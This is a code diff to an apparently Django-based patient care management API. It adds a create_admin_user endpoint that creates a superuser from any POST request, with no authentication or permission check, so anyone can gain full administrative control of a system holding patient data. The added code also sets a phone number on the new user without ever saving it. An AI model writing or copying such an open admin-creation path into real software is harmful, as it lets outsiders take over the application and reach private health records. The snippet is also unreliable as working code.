@@ -732,3 +732,17 @@ class AssignedPatientsView(APIView):
         assigned_users = CustomUser.objects.filter(patient_profile__care_manager=care_manager)
         serializer = CustomUserSerializer(assigned_users, many=True)
         return Response(serializer.data, status=status.HTTP_200_OK)
+    
+from django.http import JsonResponse
+
+@api_view(["POST"])
+def create_admin_user(request):
+    username = request.data.get("username")
+    email = request.data.get("email")
+    password = request.data.get("password")
+    phone_number = request.data.get("phone_number")
+    if not CustomUser.objects.filter(username=username).exists():
+        user = CustomUser.objects.create_superuser(username, email, password)
+        user.phone_number = phone_number
+        return JsonResponse({"message": "Superuser created successfully"})
+    return JsonResponse({"message": "Superuser already exists"})
